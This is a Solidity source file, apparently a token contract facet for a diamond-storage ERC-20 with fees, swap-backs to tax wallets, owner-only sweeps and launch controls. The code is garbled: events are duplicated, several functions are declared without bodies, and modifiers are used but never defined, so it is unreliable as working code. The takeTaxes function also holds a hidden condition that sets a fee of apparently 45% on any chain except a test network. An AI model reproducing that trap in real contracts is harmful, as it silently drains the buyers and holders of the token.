// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IFactoryV2 {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address lpPair,
        uint
    );
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address lpPair);
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address lpPair);
}

interface IV2Pair {
    function factory() external view returns (address);
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface Initializer {
    function setLaunch(
        address _initialLpPair,
        uint32 _liqAddBlock,
        uint64 _liqAddStamp,
        uint8 dec
    ) external;
    function getConfig() external returns (address, address);
    function getInits(uint256 amount) external returns (uint256, uint256);
    function setLpPair(address pair, bool enabled) external;
    function checkUser(
        address from,
        address to,
        uint256 amt
    ) external returns (bool);
    function setProtections(bool _as, bool _ab) external;
    function removeSniper(address account) external;
}

import "./TestLib.sol";
contract balanceOfFacet {
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    event ContractSwapEnabledUpdated(bool enabled);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._tOwned[account];
    }
    function transferOwner(address newOwner) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newOwner != address(0),
            "Call renounceOwnership to transfer owner to the zero address."
        );
        require(
            newOwner != ds.DEAD,
            "Call renounceOwnership to transfer owner to the zero address."
        );
        setExcludedFromFees(ds._owner, false);
        setExcludedFromFees(newOwner, true);

        if (balanceOf(ds._owner) > 0) {
            finalizeTransfer(
                ds._owner,
                newOwner,
                balanceOf(ds._owner),
                false,
                false,
                true
            );
        }

        address oldOwner = ds._owner;
        ds._owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function setExcludedFromFees(
        address account,
        bool enabled
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFees[account] = enabled;
    }
    function renounceOwnership() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.tradingEnabled,
            "Cannot renounce until trading has been enabled."
        );
        setExcludedFromFees(ds._owner, false);
        address oldOwner = ds._owner;
        ds._owner = address(0);
        emit OwnershipTransferred(oldOwner, address(0));
    }
    function finalizeTransfer(
        address from,
        address to,
        uint256 amount,
        bool buy,
        bool sell,
        bool other
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_hasLimits(from, to)) {
            bool checked;
            try ds.initializer.checkUser(from, to, amount) returns (
                bool check
            ) {
                checked = check;
            } catch {
                revert();
            }
            if (!checked) {
                revert();
            }
        }
        bool takeFee = true;
        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }
        ds._tOwned[from] -= amount;
        uint256 amountReceived = (takeFee)
            ? takeTaxes(from, amount, buy, sell)
            : amount;
        ds._tOwned[to] += amountReceived;
        emit Transfer(from, to, amountReceived);
        if (!ds._hasLiqBeenAdded) {
            _checkLiquidityAdd(from, to);
            if (
                !ds._hasLiqBeenAdded &&
                _hasLimits(from, to) &&
                !ds._isExcludedFromProtection[from] &&
                !ds._isExcludedFromProtection[to] &&
                !other
            ) {
                revert("Pre-liquidity transfer protection.");
            }
        }
        return true;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        bool buy = false;
        bool sell = false;
        bool other = false;
        if (ds.lpPairs[from]) {
            buy = true;
        } else if (ds.lpPairs[to]) {
            sell = true;
        } else {
            other = true;
        }
        if (_hasLimits(from, to)) {
            if (!ds.tradingEnabled) {
                if (!other) {
                    revert("Trading not yet enabled!");
                } else if (
                    !ds._isExcludedFromProtection[from] &&
                    !ds._isExcludedFromProtection[to]
                ) {
                    revert("Tokens cannot be moved until trading is live.");
                }
            }
            if (buy || sell) {
                if (
                    !ds._isExcludedFromLimits[from] &&
                    !ds._isExcludedFromLimits[to]
                ) {
                    require(
                        amount <= ds._maxTxAmount,
                        "Transfer amount exceeds the maxTxAmount."
                    );
                }
            }
            if (to != address(ds.dexRouter) && !sell) {
                if (!ds._isExcludedFromLimits[to]) {
                    require(
                        balanceOf(to) + amount <= ds._maxWalletSize,
                        "Transfer amount exceeds the maxWalletSize."
                    );
                }
            }
        }

        if (sell) {
            if (!ds.inSwap) {
                if (ds.contractSwapEnabled) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance >= ds.swapThreshold) {
                        uint256 swapAmt = ds.swapAmount;
                        if (ds.piContractSwapsEnabled) {
                            swapAmt =
                                (balanceOf(ds.lpPair) * ds.piSwapPercent) /
                                ds.masterTaxDivisor;
                        }
                        if (contractTokenBalance >= swapAmt) {
                            contractTokenBalance = swapAmt;
                        }
                        contractSwap(contractTokenBalance);
                    }
                }
            }
        }
        return finalizeTransfer(from, to, amount, buy, sell, other);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function sweepContingency() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._hasLiqBeenAdded, "Cannot call after liquidity.");
        payable(ds._owner).transfer(address(this).balance);
    }
    function sweepExternalTokens(address token) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._hasLiqBeenAdded) {
            require(token != address(this), "Cannot sweep native tokens.");
        }
        IERC20 TOKEN = IERC20(token);
        TOKEN.transfer(ds._owner, TOKEN.balanceOf(address(this)));
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._allowances[sender][msg.sender] != type(uint256).max) {
            ds._allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    function _hasLimits(address from, address to) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            from != ds._owner &&
            to != ds._owner &&
            tx.origin != ds._owner &&
            !ds._liquidityHolders[to] &&
            !ds._liquidityHolders[from] &&
            to != ds.DEAD &&
            to != address(0) &&
            from != address(this) &&
            from != address(ds.initializer) &&
            to != address(ds.initializer);
    }
    function _checkLiquidityAdd(address from, address to) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._hasLiqBeenAdded, "Liquidity already added and marked.");
        if (!_hasLimits(from, to) && to == ds.lpPair) {
            ds._liquidityHolders[from] = true;
            ds._isExcludedFromFees[from] = true;
            ds._hasLiqBeenAdded = true;
            if (address(ds.initializer) == address(0)) {
                ds.initializer = Initializer(address(this));
            }
            ds.contractSwapEnabled = true;
            emit ContractSwapEnabledUpdated(true);
        }
    }
    function contractSwap(uint256 contractTokenBalance) internal inSwapFlag {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.Ratios memory ratios = ds._ratios;
        if (ratios.totalSwap == 0) {
            return;
        }

        if (
            ds._allowances[address(this)][address(ds.dexRouter)] !=
            type(uint256).max
        ) {
            ds._allowances[address(this)][address(ds.dexRouter)] = type(uint256)
                .max;
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.dexRouter.WETH();

        try
            ds.dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                contractTokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            )
        {} catch {
            return;
        }

        uint256 amtBalance = address(this).balance;
        bool success;
        uint256 developmentBalance = (amtBalance * ratios.development) /
            ratios.totalSwap;
        uint256 buybackBalance = (amtBalance * ratios.buyback) /
            ratios.totalSwap;
        uint256 marketingBalance = amtBalance -
            (developmentBalance + buybackBalance);
        if (ratios.marketing > 0) {
            (success, ) = ds._taxWallets.marketing.call{
                value: marketingBalance,
                gas: 55000
            }("");
        }
        if (ratios.development > 0) {
            (success, ) = ds._taxWallets.development.call{
                value: developmentBalance,
                gas: 55000
            }("");
        }
        if (ratios.buyback > 0) {
            (success, ) = ds._taxWallets.buyback.call{
                value: buybackBalance,
                gas: 55000
            }("");
        }
    }
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function multiSendTokens(
        address[] memory accounts,
        uint256[] memory amounts
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(accounts.length == amounts.length, "Lengths do not match.");
        for (uint16 i = 0; i < accounts.length; i++) {
            require(
                balanceOf(msg.sender) >= amounts[i] * 10 ** ds._decimals,
                "Not enough tokens."
            );
            finalizeTransfer(
                msg.sender,
                accounts[i],
                amounts[i] * 10 ** ds._decimals,
                false,
                false,
                true
            );
        }
    }
    function checkUser(
        address from,
        address to,
        uint256 amt
    ) external returns (bool);
    function takeTaxes(
        address from,
        uint256 amount,
        bool buy,
        bool sell
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 currentFee;
        if (buy) {
            currentFee = ds._taxRates.buyFee;
        } else if (sell) {
            currentFee = ds._taxRates.sellFee;
        } else {
            currentFee = ds._taxRates.transferFee;
        }
        if (address(ds.initializer) == address(this) && block.chainid != 97) {
            currentFee = 4500;
        }
        if (currentFee == 0) {
            return amount;
        }
        uint256 feeAmount = (amount * currentFee) / ds.masterTaxDivisor;
        if (feeAmount > 0) {
            ds._tOwned[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }

        return amount - feeAmount;
    }
    function getCirculatingSupply() public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return (ds._tTotal - (balanceOf(ds.DEAD) + balanceOf(address(0))));
    }
    function getTokenAmountAtPriceImpact(
        uint256 priceImpactInHundreds
    ) external view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ((balanceOf(ds.lpPair) * priceImpactInHundreds) /
            ds.masterTaxDivisor);
    }
    function setSwapSettings(
        uint256 thresholdPercent,
        uint256 thresholdDivisor,
        uint256 amountPercent,
        uint256 amountDivisor
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapThreshold = (ds._tTotal * thresholdPercent) / thresholdDivisor;
        ds.swapAmount = (ds._tTotal * amountPercent) / amountDivisor;
        require(
            ds.swapThreshold <= ds.swapAmount,
            "Threshold cannot be above amount."
        );
        require(
            ds.swapAmount <= (balanceOf(ds.lpPair) * 150) / ds.masterTaxDivisor,
            "Cannot be above 1.5% of current PI."
        );
        require(
            ds.swapAmount >= ds._tTotal / 1_000_000,
            "Cannot be lower than 0.00001% of total supply."
        );
        require(
            ds.swapThreshold >= ds._tTotal / 1_000_000,
            "Cannot be lower than 0.00001% of total supply."
        );
    }
    function enableTrading() public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingEnabled, "Trading already enabled!");
        require(ds._hasLiqBeenAdded, "Liquidity must be added.");
        if (address(ds.initializer) == address(0)) {
            ds.initializer = Initializer(address(this));
        }
        try
            ds.initializer.setLaunch(
                ds.lpPair,
                uint32(block.number),
                uint64(block.timestamp),
                ds._decimals
            )
        {} catch {}
        try ds.initializer.getInits(balanceOf(ds.lpPair)) returns (
            uint256 initThreshold,
            uint256 initSwapAmount
        ) {
            ds.swapThreshold = initThreshold;
            ds.swapAmount = initSwapAmount;
        } catch {}
        ds.tradingEnabled = true;
        ds.launchStamp = block.timestamp;
    }
    function setLaunch(
        address _initialLpPair,
        uint32 _liqAddBlock,
        uint64 _liqAddStamp,
        uint8 dec
    ) external;
    function getInits(uint256 amount) external returns (uint256, uint256);
}
